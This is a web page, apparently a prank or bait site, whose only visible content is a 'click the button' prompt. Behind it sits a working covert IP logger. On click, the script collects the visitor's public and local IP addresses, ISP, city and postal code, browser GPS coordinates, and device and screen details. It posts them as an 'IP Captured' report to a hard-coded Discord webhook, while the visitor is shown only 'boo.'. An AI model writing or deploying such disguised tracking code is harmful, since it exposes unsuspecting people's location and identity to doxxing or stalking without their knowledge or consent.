<!DOCTYPE html>
<html>
<head>
    <title>click the button</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
        button { padding: 12px 24px; font-size: 16px; background-color: #5865F2; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #4752C4; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        #status { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
    </style>
</head>
<body>
    <h1>click the button website thing</h1>
    <p>click the button below:</p>
    
    <button id="trackButton">Click Me</button>
    <div id="status"></div>
    
    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        // Better device detection function
        function detectDevice() {
            const ua = navigator.userAgent.toLowerCase();
            let deviceType = 'Desktop';
            let os = 'Unknown';
            let browser = 'Unknown';
            
            // Device type detection
            if (/mobile|android|iphone|ipad|ipod|blackberry|iemobile|opera mini|windows phone/i.test(ua)) {
                deviceType = 'Mobile';
            }
            if (/tablet|ipad|android(?!.*mobile)|kindle|silk/i.test(ua)) {
                deviceType = 'Tablet';
            }
            
            // OS detection
            if (/windows/.test(ua)) {
                if (/windows nt 5/.test(ua)) os = 'Windows XP';
                else if (/windows nt 6.0/.test(ua)) os = 'Windows Vista';
                else if (/windows nt 6.1/.test(ua)) os = 'Windows 7';
                else if (/windows nt 6.2/.test(ua)) os = 'Windows 8';
                else if (/windows nt 6.3/.test(ua)) os = 'Windows 8.1';
                else if (/windows nt 10/.test(ua)) os = 'Windows 10';
                else if (/windows nt 11/.test(ua)) os = 'Windows 11';
                else os = 'Windows';
            } else if (/mac os x/.test(ua)) {
                os = 'macOS';
            } else if (/linux/.test(ua)) {
                os = 'Linux';
            } else if (/android/.test(ua)) {
                os = 'Android';
            } else if (/iphone|ipad|ipod/.test(ua)) {
                os = 'iOS';
            } else if (/cros/.test(ua)) {
                os = 'Chrome OS';
            }
            
            // Browser detection
            if (/edg/.test(ua)) browser = 'Microsoft Edge';
            else if (/chrome/.test(ua)) browser = 'Google Chrome';
            else if (/firefox/.test(ua)) browser = 'Mozilla Firefox';
            else if (/safari/.test(ua) && !/chrome/.test(ua)) browser = 'Safari';
            else if (/opera|opr/.test(ua)) browser = 'Opera';
            else if (/msie|trident/.test(ua)) browser = 'Internet Explorer';
            else if (/brave/.test(ua)) browser = 'Brave';
            
            // Simple device name based on OS
            let deviceName = `${deviceType} - ${os}`;
            
            return {
                deviceType,
                os,
                browser,
                deviceName,
                userAgent: navigator.userAgent
            };
        }
        
        // Working local IP function
        async function getLocalIP() {
            return new Promise((resolve) => {
                const ips = [];
                
                // Method 1: WebRTC
                const pc = new RTCPeerConnection({
                    iceServers: []
                });
                
                pc.createDataChannel('');
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(err => {
                        console.log('WebRTC error:', err);
                        resolve('WebRTC blocked');
                    });
                
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
                        if (ips.length === 0) {
                            resolve('Not available');
                        } else {
                            resolve(ips[0]);
                        }
                        return;
                    }
                    
                    const candidate = ice.candidate.candidate;
                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const match = candidate.match(regex);
                    
                    if (match && match[1]) {
                        const ip = match[1];
                        // Filter for private IPs only
                        if (ip.startsWith('192.168.') || 
                            ip.startsWith('10.') || 
                            (ip.startsWith('172.') && 
                             parseInt(ip.split('.')[1]) >= 16 && 
                             parseInt(ip.split('.')[1]) <= 31)) {
                            if (!ips.includes(ip)) {
                                ips.push(ip);
                            }
                        }
                    }
                };
                
                // Timeout
                setTimeout(() => {
                    pc.close();
                    if (ips.length > 0) {
                        resolve(ips[0]);
                    } else {
                        resolve('Could not determine');
                    }
                }, 1500);
            });
        }
        
        // Better geolocation API function
        async function getLocationInfo(ip) {
            try {
                // Try ip-api.com first (more accurate for many locations)
                const response1 = await fetch(`http://ip-api.com/json/${ip}`);
                const data1 = await response1.json();
                
                if (data1.status === 'success') {
                    return {
                        city: data1.city || 'Unknown',
                        region: data1.regionName || data1.region || 'Unknown',
                        country: data1.country || data1.country_name || 'Unknown',
                        isp: data1.isp || data1.org || 'Unknown',
                        zip: data1.zip || data1.postal || 'Unknown',
                        timezone: data1.timezone || 'Unknown',
                        lat: data1.lat || data1.latitude || 'Unknown',
                        lon: data1.lon || data1.longitude || 'Unknown',
                        source: 'ip-api.com'
                    };
                }
            } catch (e) {
                console.log('ip-api.com failed, trying ipapi.co');
            }
            
            // Fallback to ipapi.co
            try {
                const response2 = await fetch(`https://ipapi.co/${ip}/json/`);
                const data2 = await response2.json();
                
                return {
                    city: data2.city || 'Unknown',
                    region: data2.region || data2.region_name || 'Unknown',
                    country: data2.country_name || data2.country || 'Unknown',
                    isp: data2.org || 'Unknown',
                    zip: data2.postal || data2.zip || 'Unknown',
                    timezone: data2.timezone || 'Unknown',
                    lat: data2.latitude || 'Unknown',
                    lon: data2.longitude || 'Unknown',
                    source: 'ipapi.co'
                };
            } catch (e) {
                console.log('All location APIs failed');
                return {
                    city: 'Unknown',
                    region: 'Unknown',
                    country: 'Unknown',
                    isp: 'Unknown',
                    zip: 'Unknown',
                    timezone: 'Unknown',
                    lat: 'Unknown',
                    lon: 'Unknown',
                    source: 'None'
                };
            }
        }
        
        document.getElementById('trackButton').addEventListener('click', async function() {
            const button = this;
            const status = document.getElementById('status');
            
            button.disabled = true;
            button.textContent = 'Processing...';
            status.style.display = 'none';
            
            try {
                // Get public IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const publicIP = ipData.ip;
                
                // Get local IP
                const localIP = await getLocalIP();
                
                // Get accurate location info
                const locationInfo = await getLocationInfo(publicIP);
                
                // Detect device info
                const deviceInfo = detectDevice();
                
                // Get screen resolution
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const screenDepth = screen.colorDepth;
                const pixelRatio = window.devicePixelRatio || 1;
                
                // Get browser info
                const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
                const doNotTrack = navigator.doNotTrack || navigator.msDoNotTrack || 'Unknown';
                const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
                const referrer = document.referrer || 'Direct visit';
                const language = navigator.language || 'Unknown';
                
                // Get more accurate coordinates using browser geolocation API (if user allows)
                let accurateLat = locationInfo.lat;
                let accurateLon = locationInfo.lon;
                let accuracy = 'IP-based';
                
                // Try to get browser geolocation (more accurate)
                if (navigator.geolocation) {
                    try {
                        const geoPromise = new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(
                                (position) => {
                                    resolve({
                                        lat: position.coords.latitude.toFixed(6),
                                        lon: position.coords.longitude.toFixed(6),
                                        accuracy: position.coords.accuracy,
                                        source: 'Browser GPS'
                                    });
                                },
                                (error) => {
                                    reject(error);
                                },
                                { timeout: 3000 }
                            );
                        });
                        
                        const geoData = await Promise.race([
                            geoPromise,
                            new Promise(resolve => setTimeout(() => resolve(null), 3000))
                        ]);
                        
                        if (geoData) {
                            accurateLat = geoData.lat;
                            accurateLon = geoData.lon;
                            accuracy = `GPS (Accuracy: ${Math.round(geoData.accuracy)}m)`;
                        }
                    } catch (e) {
                        console.log('Geolocation denied or failed');
                    }
                }
                
                // Get time
                const now = new Date();
                const dateStr = `${now.getDate()}/${now.getMonth()+1}/${now.getFullYear()}`;
                let hours = now.getHours();
                const ampm = hours >= 12 ? 'PM' : 'AM';
                hours = hours % 12;
                hours = hours ? hours : 12;
                const timeStr = `${hours.toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')} ${ampm}`;
                
                // Create Google Maps link from coordinates
                const mapsLink = (accurateLat !== 'Unknown' && accurateLon !== 'Unknown') 
                    ? `https://www.google.com/maps?q=${accurateLat},${accurateLon}`
                    : 'No coordinates available';
                
                // Create Discord embed
                const embed = {
                    title: "IP Captured - Complete Report",
                    color: 16711680, // Red color
                    fields: [
                        {
                            name: "IP ADDRESSES",
                            value: `**Public IP:** \`${publicIP}\`\n**Local IP:** \`${localIP}\`\n**ISP:** ${locationInfo.isp}`,
                            inline: true
                        },
                        {
                            name: "LOCATION INFO",
                            value: `**City:** ${locationInfo.city}\n**Region:** ${locationInfo.region}\n**Country:** ${locationInfo.country}\n**ZIP:** ${locationInfo.zip}\n**Timezone:** ${locationInfo.timezone}`,
                            inline: true
                        },
                        {
                            name: "COORDINATES",
                            value: `**Latitude:** ${accurateLat}\n**Longitude:** ${accurateLon}\n**Accuracy:** ${accuracy}\n**Source:** ${locationInfo.source}\n**Maps:** ${mapsLink}`,
                            inline: true
                        },
                        {
                            name: "DEVICE & OS",
                            value: `**Device:** ${deviceInfo.deviceType}\n**OS:** ${deviceInfo.os}\n**Browser:** ${deviceInfo.browser}\n**Device Name:** ${deviceInfo.deviceName}`,
                            inline: true
                        },
                        {
                            name: "SCREEN INFO",
                            value: `**Resolution:** ${screenWidth}x${screenHeight}\n**Pixel Ratio:** ${pixelRatio}\n**Color Depth:** ${screenDepth}bit\n**Language:** ${language}`,
                            inline: true
                        },
                        {
                            name: "TIME & DATE",
                            value: `**Date:** ${dateStr}\n**Time:** ${timeStr}\n**UTC:** ${now.toUTCString()}\n**Timestamp:** ${now.getTime()}`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: `IP Logger • Location source: ${locationInfo.source} • Coordinates: ${accuracy}`
                    },
                    timestamp: new Date().toISOString()
                };
                
                const discordMessage = {
                    embeds: [embed],
                    username: "IP Logger"
                };
                
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(discordMessage)
                });
                
                if (response.ok) {
                    status.textContent = 'boo.';
                    status.style.color = '#4CAF50';
                    status.style.backgroundColor = '#E8F5E9';
                } else {
                    throw new Error('Discord error');
                }
                
            } catch (error) {
                console.error('Error:', error);
                status.textContent = 'oops, error.';
                status.style.color = '#F44336';
                status.style.backgroundColor = '#FFEBEE';
            } finally {
                button.disabled = false;
                button.textContent = 'click me';
                status.style.display = 'block';
            }
        });
    </script>
</body>
</html>
